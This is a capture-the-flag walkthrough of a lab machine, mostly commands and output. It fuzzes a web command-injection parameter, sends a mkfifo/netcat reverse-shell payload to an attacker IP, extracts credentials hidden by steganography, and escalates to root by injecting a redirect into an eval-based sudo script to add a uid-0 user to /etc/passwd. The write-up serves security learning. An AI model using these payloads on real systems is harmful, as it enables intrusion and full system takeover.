
##### **Nmap Scan:**

`nmap -A 10.10.245.95 -v -Pn -oN nmap.txt`
`nmap -T4 -n -sC -sV -Pn -p- 10.10.74.25`

There are two ports open.
- 22/SSH
- 80/HTTP



##### **Find hidden directories**

`feroxbuster -u http://10.10.245.95 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

There are two hidden directories I got.
- `/assets`
- `/assets/images`





##### **To search further for the hidden parameters:**

`      ffuf -u 'http://10.10.74.25/assets/index.php?FUZZ=id' -mc all -ic -t 100 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -fs 0      `




##### **From here we find the cmd parameter. Using curl we see:**

`curl -s 'http://10.10.245.95/assets/index.php?cmd=id'

Decode base64:

`curl --silent 10.10.245.95/assets/index.php?cmd=id | base64 -d`




###### **I will now move on to blind data exfiltration.**
###### **Looking at the present working directory and the contents of it. We see:**

`curl -s 'http://10.10.245.95/assets/index.php' -G --data-urlencode 'cmd=pwd' | base64 -d`

`curl -s 'http://10.10.245.95/assets/index.php' -G --data-urlencode 'cmd=ls -la' | base64 -d`

###### **Digging more I found a interesting file:**

`curl -s 'http://10.10.245.95/assets/index.php' -G --data-urlencode 'cmd=cat /var/www/Hidden_Content/passphrase.txt | base64 -d' | base64 -d`

###### **And some images:**

`curl -s 'http://10.10.245.95/assets/index.php' -G --data-urlencode 'cmd=ls -la images' | base64 -d`




###### **I downloaded both images using wget:**

```
wget http://10.10.245.95/assets/images/oneforall.jpg  
wget http://10.10.245.95/assets/images/yuei.jpg
```




###### **First, starting our listener to catch the reverse shell.**

`nc -lvnp 443`
###### **Sending our reverse shell payload with the `curl` command.**

`curl -s 'http://10.10.245.95/assets/index.php' -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.17.22.228 443 >/tmp/f'`






```
www-data@ip-10-10-143-172:/var/www$ ls -la
ls -la
total 16
drwxr-xr-x  4 www-data www-data 4096 Dec 13  2023 .
drwxr-xr-x 14 root     root     4096 Jul  9  2023 ..
drwxrwxr-x  2 www-data www-data 4096 Jul  9  2023 Hidden_Content
drwxr-xr-x  3 www-data www-data 4096 Dec 13  2023 html
www-data@ip-10-10-143-172:/var/www$ cd Hidden_Content
cd Hidden_Content
www-data@ip-10-10-143-172:/var/www/Hidden_Content$ ls -la
ls -la
total 12
drwxrwxr-x 2 www-data www-data 4096 Jul  9  2023 .
drwxr-xr-x 4 www-data www-data 4096 Dec 13  2023 ..
-rw-rw-r-- 1 www-data www-data   29 Jul  9  2023 passphrase.txt
www-data@ip-10-10-143-172:/var/www/Hidden_Content$ cat passphrase.txt
cat passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg==

```


Decode base64 string:

`echo "QWxsbWlnaHRGb3JFdmVyISEhCg==" | base64 -d`      
**output**:  Decoding it from the base64, we get a passphrase: AllmightForEver!!!




Checking for steganography: 
`   steghide extract -sf oneforall.jpg   `



Looking at the hex dump for the image, we can see this is due to the image having the magic bytes for `PNG`

`   xxd oneforall.jpg | head   `



Well, the `steghide` does not support `PNG` files, and the file already has the `JPG` extension. We can try changing the `PNG` magic bytes (`89 50 4E 47 0D 0A 1A 0A`) to `JPG` magic bytes (`FF D8 FF E0 00 10 4A 46 49 46 00 01`).

```
serch file signature  --> go inside wikipidia page
CTRL + F "jpg"  --->  FF D8 FF E0 00 10 4A 46 49 46 00 01

Another process:
search magicbytes github   ---> magicbytes.py / fixmagicbytes.py
```

Using `hexeditor` for this.

`   hexeditor -b oneforall.jpg   `



Now go back to the steghide and try to crack and see the Image:
```
steghide extract -sf oneforall.jpg
password: AllmightForEver!!!   ---> output file "creds.txt"


cat creds.txt  ---> deku:One?For?All_!!one1/A (user:pass)
```

Open the image now:
`    eog oneforall.jpg    `


Connect to SSH port:

```
ssh deku@10.10.245.95
password: One?For?All_!!one1/A
```


## Shell as root
Checking the `sudo` permissions for the `deku` user, we see that we are able to run the `/opt/NewComponent/feedback.sh` script as root.

```
deku@ip-10-10-143-172:~$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on ip-10-10-143-172:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on ip-10-10-143-172:
    (ALL) /opt/NewComponent/feedback.sh
```


Looking at the permissions for the script, our user owns it. So, we should be able to modify it.
`   ls -la /opt/NewComponent/feedback.sh   `


But if we try to do so, we can see it is not permitted.
`   echo -e '#!/bin/bash\nchmod +s /bin/bash' > /opt/NewComponent/feedback.sh `


Listing the attributes for the file, we can see that the `i` flag is set, which prevents us from modifying it.
`   lsattr /opt/NewComponent/feedback.sh   `

Result:
```
----i---------e----- /opt/NewComponent/feedback.sh

Here, the `i` flag means the file is **immutable** — it can't be modified, renamed, or deleted.

|`i`| Immutable — can't be changed, even by root|

|`a`| Append-only — can only be written to, not overwritten|

|`d`| No dump — excluded from `dump` backups|

|`e`| Extents — indicates use of extents (ext4 performance feature)|

|`j`| Data is journaled|
```



Check the code:
`   cat /opt/NewComponent/feedback.sh   `


It checks if our inputs include any one of the `` ` ``, `)`, `$(`, `|`, `&`, `;`, `?`, `!`, `\` characters.
```
if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
```


Luckily, neither `>` nor `/` are one of the restricted characters; we can use this to write to any file we want as the `root` user like this:

`sudo /opt/NewComponent/feedback.sh`

Result:
```
deku@ip-10-10-143-172:~$ sudo /opt/NewComponent/feedback.sh
[sudo] password for deku: 
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
test > /tmp/test.txt
It is This:
Feedback successfully saved.
deku@ip-10-10-143-172:~$ cat /tmp/test.txt
test
deku@ip-10-10-143-172:~$ ls -la /tmp/test.txt
-rw-r--r-- 1 root root 5 May 26 23:28 /tmp/test.txt
```




With our input as `test > /tmp/test.txt`, the command passed to the eval becomes: `eval "echo test > /tmp/test.txt"` and we are able to write to the `/tmp/test.txt` file.

Using this, we can make an addition to the `/etc/passwd` file and manually add an user with `uid` and `gid` set to `0` ( same as the `root` user ).

First, creating a password hash.
```
mkpasswd -m md5crypt -s 
Password: 123 
$1$MgMMCplp$bx1JXnOEyOXMkHf9VnHgK0
```


Formatting the user information in the style of the `/etc/passwd`.
`   'fuckman:$1$WZEiJehy$jGyYPy9gcbptNKIf48rUv1:0:0:fuckman:/bin/bash' >> /etc/passwd    `


Now, writing it to the `/etc/passwd` file using the `/opt/NewComponent/feedback.sh` script.

```
deku@ip-10-10-143-172:~$ sudo /opt/NewComponent/feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
'fuckman:$1$WZEiJehy$jGyYPy9gcbptNKIf48rUv1:0:0:fuckman:/bin/bash' >> /etc/passwd
It is This:
Feedback successfully saved.
```


Now check new user set or not:
`     cat /etc/passwd | grep fuckman    `


At last, we can switch to this new user using "su":
```
su fuckman
password: 123

cat /root/root.txt
```